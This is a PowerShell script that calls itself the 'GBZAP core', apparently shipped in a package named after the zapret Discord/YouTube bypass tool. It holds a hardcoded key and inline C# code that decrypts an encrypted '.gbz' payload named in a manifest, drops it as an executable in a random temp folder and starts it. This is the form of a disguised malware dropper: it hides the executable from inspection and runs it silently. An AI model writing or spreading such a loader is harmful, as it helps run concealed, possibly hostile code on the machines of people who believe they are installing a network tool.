# GBZAP core — auto-generated
param(
  [Parameter(Mandatory=$true)][string]$PayloadId
)
$ErrorActionPreference = 'Stop'
$Repo = "zapret-discord-youtube-2026"
$MasterKey = [Convert]::FromBase64String('CynbOXK2uf9FqtoQiRYn5KCbbxQ2wF2mECGaTXok+PQ=')

if (-not ('GbzapCrypto' -as [type])) {
Add-Type @'
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public static class GbzapCrypto {
  static byte[] RepoKey(byte[] mk, string repo) {
    using (var sha = SHA256.Create()) {
      using (var ms = new MemoryStream()) {
        ms.Write(mk, 0, mk.Length);
        var rb = Encoding.UTF8.GetBytes(repo.ToLower().Trim());
        ms.Write(rb, 0, rb.Length);
        return sha.ComputeHash(ms.ToArray());
      }
    }
  }
  static byte[] KeyStream(byte[] key, byte[] nonce, byte[] label, int len) {
    var outb = new byte[len];
    int pos = 0, ctr = 0;
    using (var hmac = new HMACSHA256(key)) {
      while (pos < len) {
        using (var buf = new MemoryStream()) {
          buf.Write(nonce, 0, nonce.Length);
          buf.Write(label, 0, label.Length);
          var cb = BitConverter.GetBytes((uint)ctr);
          buf.Write(cb, 0, 4);
          var blk = hmac.ComputeHash(buf.ToArray());
          int take = Math.Min(blk.Length, len - pos);
          Buffer.BlockCopy(blk, 0, outb, pos, take);
          pos += take;
        }
        ctr++;
      }
    }
    return outb;
  }
  public static byte[] DecryptGbz(byte[] blob, byte[] mk, string repo, string label) {
    if (blob.Length < 22) throw new Exception("bad gbz");
  var magic = Encoding.ASCII.GetString(blob, 0, 5);
    if (magic != "GBZC1") throw new Exception("not GBZC1");
    var nonce = new byte[16];
    Buffer.BlockCopy(blob, 5, nonce, 0, 16);
    int ll = blob[21];
    var labelBytes = new byte[ll];
    Buffer.BlockCopy(blob, 22, labelBytes, 0, ll);
    int clen = blob.Length - 22 - ll;
    var cipher = new byte[clen];
    Buffer.BlockCopy(blob, 22 + ll, cipher, 0, clen);
    var repoKey = RepoKey(mk, repo);
    var stream = KeyStream(repoKey, nonce, labelBytes, clen);
    for (int i = 0; i < clen; i++) cipher[i] ^= stream[i];
    return cipher;
  }
}
'@
}

$root = $PSScriptRoot
$manifest = Join-Path $root 'manifest.json'
if (-not (Test-Path -LiteralPath $manifest)) { throw 'manifest.json missing' }
$map = Get-Content -LiteralPath $manifest -Raw -Encoding UTF8 | ConvertFrom-Json
$exeLabel = [string]$map.$PayloadId
if (-not $exeLabel) { throw "unknown payload id: $PayloadId" }
$gbzPath = Join-Path $root ($PayloadId + '.gbz')
if (-not (Test-Path -LiteralPath $gbzPath)) { throw "missing: $PayloadId.gbz" }
$blob = [IO.File]::ReadAllBytes($gbzPath)
$plain = [GbzapCrypto]::DecryptGbz($blob, $MasterKey, $Repo, $exeLabel)
$runDir = Join-Path $env:TEMP ("gbzap_" + [guid]::NewGuid().ToString('N').Substring(0,12))
[IO.Directory]::CreateDirectory($runDir) | Out-Null
$outExe = Join-Path $runDir ([IO.Path]::GetFileName($exeLabel))
[IO.File]::WriteAllBytes($outExe, $plain)
Start-Process -FilePath $outExe -WorkingDirectory $runDir
